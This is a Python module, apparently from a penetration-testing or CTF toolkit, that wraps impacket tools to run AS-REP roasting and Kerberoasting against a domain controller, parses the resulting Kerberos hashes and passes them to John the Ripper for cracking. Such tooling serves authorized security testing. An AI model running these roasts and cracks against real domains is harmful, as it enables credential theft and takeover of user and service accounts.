"""Kerberos roast helpers (Backlog #8).

AS-REP roasting (no-preauth users) and Kerberoasting (service accounts)
via impacket, with hashes handed to John for cracking. Explicit only:
each roast is its own endpoint + button, and cracking runs only when the
operator asks (`crack=true`). Sandbox returns canned hashes.
"""

from __future__ import annotations

import logging
import re
import subprocess  # nosec B404 - fixed-argv impacket wrappers
from collections.abc import Callable
from typing import Any

logger = logging.getLogger("h4k.kerberos")

GETNPUSERS = "impacket-GetNPUsers"
GETUSERSPNS = "impacket-GetUserSPNs"

_HASH_RE = re.compile(r"\$(?:krb5asrep|krb5tgs)\$[^\s]+")


def extract_hashes(text: str) -> list[str]:
    """Pull $krb5asrep$ / $krb5tgs$ hashes out of tool output."""
    seen: list[str] = []
    for h in _HASH_RE.findall(text or ""):
        if h not in seen:
            seen.append(h)
    return seen


class KerberosService:
    """AS-REP + Kerberoast via impacket."""

    def __init__(self, progress: Callable[[str, float], None] | None = None) -> None:
        self.progress = progress or (lambda msg, pct: None)

    def _run(self, argv: list[str], timeout: int = 300) -> dict[str, Any]:
        self.progress(f"[kerberos] {' '.join(argv[:6])}...", 0)
        try:
            proc = subprocess.run(  # nosec B603 - fixed argv, no shell
                argv,
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False,
            )
            return {
                "stdout": proc.stdout or "",
                "stderr": proc.stderr or "",
                "rc": proc.returncode,
                "success": proc.returncode == 0,
                "timed_out": False,
            }
        except subprocess.TimeoutExpired as exc:
            return {
                "stdout": _as_text(exc.stdout),
                "stderr": _as_text(exc.stderr),
                "rc": None,
                "success": False,
                "timed_out": True,
            }
        except FileNotFoundError as exc:
            return {
                "stdout": "",
                "stderr": f"{exc.filename} not installed",
                "rc": -1,
                "success": False,
                "timed_out": False,
            }
        except Exception as exc:  # pragma: no cover - defensive
            return {
                "stdout": "",
                "stderr": str(exc),
                "rc": -1,
                "success": False,
                "timed_out": False,
            }

    def asrep_roast(
        self,
        domain: str,
        dc_ip: str | None = None,
        users: list[str] | None = None,
        timeout: int = 300,
    ) -> dict[str, Any]:
        """Request AS-REP hashes for users without Kerberos preauth."""
        argv = [GETNPUSERS, "-format", "hashcat", "-request"]
        if dc_ip:
            argv += ["-dc-ip", dc_ip]
        argv.append(domain + "/")
        if users:
            argv += users
        result = self._run(argv, timeout=timeout)
        hashes = extract_hashes(result["stdout"])
        return {**result, "hashes": hashes, "hash_count": len(hashes)}

    def kerberoast(
        self,
        domain: str,
        user: str,
        password: str,
        dc_ip: str | None = None,
        timeout: int = 300,
    ) -> dict[str, Any]:
        """Request service-ticket hashes (needs one valid account)."""
        argv = [GETUSERSPNS, "-request", "-format", "hashcat"]
        if dc_ip:
            argv += ["-dc-ip", dc_ip]
        argv.append(f"{domain}/{user}:{password}")
        result = self._run(argv, timeout=timeout)
        hashes = extract_hashes(result["stdout"])
        return {**result, "hashes": hashes, "hash_count": len(hashes)}


def crack_hashes(
    hashes: list[str], kind: str, wordlist: str | None = None, max_time: int = 60
) -> dict[str, Any]:
    """Crack roast hashes with John (explicit only)."""
    from services.john import JohnRunner

    fmt = "krb5asrep" if kind == "asrep" else "krb5tgs"
    return JohnRunner().crack_ctf_hashes(
        hashes, formats=[fmt], wordlist=wordlist, max_time_per_format=max_time
    )


def _as_text(data: str | bytes | None) -> str:
    if data is None:
        return ""
    if isinstance(data, bytes):
        return data.decode("utf-8", errors="replace")
    return data


def sandbox_hashes(kind: str) -> dict[str, Any]:
    """Deterministic canned roast (sandbox/e2e only)."""
    if kind == "asrep":
        h = "$krb5asrep$23$sandboxuser@LAB.LOCAL:deadbeef$cafe"
    else:
        h = "$krb5tgs$23$*sandboxsvc$LAB.LOCAL$*deadbeef$cafe"
    return {
        "stdout": h,
        "stderr": "",
        "rc": 0,
        "success": True,
        "timed_out": False,
        "hashes": [h],
        "hash_count": 1,
        "sandbox": True,
    }
